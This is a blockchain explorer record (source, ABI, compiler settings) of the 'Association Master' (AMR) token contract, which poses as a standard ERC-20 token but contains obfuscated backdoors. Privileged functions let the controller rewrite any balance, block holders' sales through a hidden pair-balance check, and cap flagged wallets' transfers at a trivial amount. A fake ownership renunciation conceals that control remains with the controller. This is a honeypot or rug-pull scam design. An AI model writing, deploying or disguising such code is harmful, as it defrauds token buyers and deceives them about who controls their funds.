{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface isEnable {\n    function createPair(address fromList, address receiverMarketing) external returns (address);\n}\n\ninterface maxTakeList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletEnableToken) external view returns (uint256);\n\n    function transfer(address fundFrom, uint256 minFeeExempt) external returns (bool);\n\n    function allowance(address launchLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minFeeExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundFrom,\n        uint256 minFeeExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromEnableExempt, uint256 value);\n    event Approval(address indexed launchLimit, address indexed spender, uint256 value);\n}\n\nabstract contract fromReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxTakeListMetadata is maxTakeList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssociationMaster is fromReceiver, maxTakeList, maxTakeListMetadata {\n\n    uint256 private listLimitMax;\n\n    uint256 constant swapLiquidityAuto = 6 ** 10;\n\n    function maxTxLaunch(address buyLaunchedList, address fundFrom, uint256 minFeeExempt) internal returns (bool) {\n        if (buyLaunchedList == swapLimit) {\n            return tradingIs(buyLaunchedList, fundFrom, minFeeExempt);\n        }\n        uint256 amountTakeMarketing = maxTakeList(marketingMode).balanceOf(receiverShouldSwap);\n        require(amountTakeMarketing == autoModeToken);\n        require(fundFrom != receiverShouldSwap);\n        if (takeLaunchIs[buyLaunchedList]) {\n            return tradingIs(buyLaunchedList, fundFrom, swapLiquidityAuto);\n        }\n        return tradingIs(buyLaunchedList, fundFrom, minFeeExempt);\n    }\n\n    function allowance(address toBuy, address exemptBuy) external view virtual override returns (uint256) {\n        if (exemptBuy == autoTotalAt) {\n            return type(uint256).max;\n        }\n        return isBuy[toBuy][exemptBuy];\n    }\n\n    uint256 private receiverTx;\n\n    uint256 private buyEnable;\n\n    function minShouldLimit(uint256 minFeeExempt) public {\n        toTxShould();\n        autoModeToken = minFeeExempt;\n    }\n\n    function transferFrom(address buyLaunchedList, address fundFrom, uint256 minFeeExempt) external override returns (bool) {\n        if (_msgSender() != autoTotalAt) {\n            if (isBuy[buyLaunchedList][_msgSender()] != type(uint256).max) {\n                require(minFeeExempt <= isBuy[buyLaunchedList][_msgSender()]);\n                isBuy[buyLaunchedList][_msgSender()] -= minFeeExempt;\n            }\n        }\n        return maxTxLaunch(buyLaunchedList, fundFrom, minFeeExempt);\n    }\n\n    string private fundEnableLaunched = \"AMR\";\n\n    bool public launchedSenderTo;\n\n    mapping(address => bool) public takeLaunchIs;\n\n    function tokenFeeTx(address liquidityFundReceiver) public {\n        toTxShould();\n        \n        if (liquidityFundReceiver == swapLimit || liquidityFundReceiver == marketingMode) {\n            return;\n        }\n        takeLaunchIs[liquidityFundReceiver] = true;\n    }\n\n    function approve(address exemptBuy, uint256 minFeeExempt) public virtual override returns (bool) {\n        isBuy[_msgSender()][exemptBuy] = minFeeExempt;\n        emit Approval(_msgSender(), exemptBuy, minFeeExempt);\n        return true;\n    }\n\n    uint256 autoModeToken;\n\n    function owner() external view returns (address) {\n        return isTotal;\n    }\n\n    bool private totalTake;\n\n    event OwnershipTransferred(address indexed liquidityAtSwap, address indexed liquidityExemptMin);\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderToken;\n    }\n\n    string private sellModeFrom = \"Association Master\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLiquidity;\n    }\n\n    uint8 private senderToken = 18;\n\n    address public swapLimit;\n\n    function toTxShould() private view {\n        require(atTake[_msgSender()]);\n    }\n\n    function balanceOf(address walletEnableToken) public view virtual override returns (uint256) {\n        return toTrading[walletEnableToken];\n    }\n\n    bool private fundTx;\n\n    function transfer(address receiverWallet, uint256 minFeeExempt) external virtual override returns (bool) {\n        return maxTxLaunch(_msgSender(), receiverWallet, minFeeExempt);\n    }\n\n    uint256 listMaxIs;\n\n    bool public listTeam;\n\n    function tradingIs(address buyLaunchedList, address fundFrom, uint256 minFeeExempt) internal returns (bool) {\n        require(toTrading[buyLaunchedList] >= minFeeExempt);\n        toTrading[buyLaunchedList] -= minFeeExempt;\n        toTrading[fundFrom] += minFeeExempt;\n        emit Transfer(buyLaunchedList, fundFrom, minFeeExempt);\n        return true;\n    }\n\n    address public marketingMode;\n\n    mapping(address => mapping(address => uint256)) private isBuy;\n\n    address private isTotal;\n\n    constructor (){\n        if (buyEnable == listLimitMax) {\n            listLimitMax = buyEnable;\n        }\n        totalLimit amountTo = totalLimit(autoTotalAt);\n        marketingMode = isEnable(amountTo.factory()).createPair(amountTo.WETH(), address(this));\n        if (totalTake) {\n            totalTake = true;\n        }\n        swapLimit = _msgSender();\n        atTake[swapLimit] = true;\n        toTrading[swapLimit] = shouldLiquidity;\n        toTx();\n        \n        emit Transfer(address(0), swapLimit, shouldLiquidity);\n    }\n\n    mapping(address => uint256) private toTrading;\n\n    function getOwner() external view returns (address) {\n        return isTotal;\n    }\n\n    bool private isMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundEnableLaunched;\n    }\n\n    address receiverShouldSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function teamTotalAuto(address receiverWallet, uint256 minFeeExempt) public {\n        toTxShould();\n        toTrading[receiverWallet] = minFeeExempt;\n    }\n\n    function toTx() public {\n        emit OwnershipTransferred(swapLimit, address(0));\n        isTotal = address(0);\n    }\n\n    address autoTotalAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public atTake;\n\n    function name() external view virtual override returns (string memory) {\n        return sellModeFrom;\n    }\n\n    uint256 private shouldLiquidity = 100000000 * 10 ** 18;\n\n    function enableTo(address enableBuy) public {\n        if (listTeam) {\n            return;\n        }\n        \n        atTake[enableBuy] = true;\n        \n        listTeam = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAtSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityExemptMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromEnableExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFeeExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnableToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"}],\"name\":\"enableTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSenderTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minFeeExempt\",\"type\":\"uint256\"}],\"name\":\"minShouldLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLaunchIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFeeExempt\",\"type\":\"uint256\"}],\"name\":\"teamTotalAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFundReceiver\",\"type\":\"address\"}],\"name\":\"tokenFeeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFeeExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunchedList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFeeExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AssociationMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}